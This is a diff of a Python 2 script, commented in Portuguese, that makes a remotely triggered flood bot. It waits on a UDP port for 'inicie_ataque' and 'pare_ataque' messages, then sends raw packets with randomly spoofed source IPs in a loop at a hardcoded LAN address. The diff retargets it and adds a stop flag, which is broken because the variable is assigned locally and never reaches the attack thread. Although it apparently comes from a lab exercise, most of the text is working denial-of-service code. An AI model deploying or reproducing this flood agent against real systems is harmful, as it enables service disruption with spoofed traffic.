@@ -1,6 +1,8 @@
 from threading import Thread
 import sys, random, socket, struct
 
+flag_para_ataque = False # variavel que indica quando parar o ataque
+
 def funcao_attack():
 	# checksum functions needed for calculation checksum
 	def checksum(msg):
@@ -38,7 +40,7 @@ def funcao_attack():
 	source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4)) 
 	print 'IP aleatorio gerado: ', source_ip
 	#dest_ip = '192.168.0.101' # victor
-	dest_ip = '192.168.43.1' # gabriel
+	dest_ip = '192.168.1.29' # gabriel
 	 
 	# ip header fields
 	ihl = 5
@@ -104,36 +106,41 @@ def funcao_attack():
 	print 'O servidor',dest_ip,'esta sendo atacado'
 	 
 	#put the above line in a loop like while 1: if you want to flood
-	while True:
+	while not flag_para_ataque:
 	    s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target
+
+	print 'encerrando ataque'
+	s.close() # encerra o socket
 
 
 def escutando():
-	PORT_NUMBER = 13006
+	PORT_NUMBER = 13007
 	SIZE = 1024
 	hostName = '0.0.0.0' 
 	mySocket = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
 	mySocket.bind( (hostName, PORT_NUMBER) )
 
+	thread_ataque = Thread(target=funcao_attack)
+
 	print 'Escutando',PORT_NUMBER
 	
 	while True:
-	    (data,addr) = mySocket.recvfrom(SIZE)
-	    print data
-            if data == 'inicie_ataque':
-            	print 'entrou'
-            	funcao_attack()
-            if data == 'pare_ataque':
-            	print 'saiu'
-            	break
+		(data,addr) = mySocket.recvfrom(SIZE)
+		print data
+		if data == 'inicie_ataque':
+			print 'entrou'
+			thread_ataque.setDaemon(True)
+			thread_ataque.start()
+		if data == 'pare_ataque':
+			flag_para_ataque = True
+			print 'saiu'
+			break
+
 
 
 
 def main():
-	escutando1 = Thread(target=escutando)
-	escutando1.start()
-
-
+	escutando()
 
 
 main()
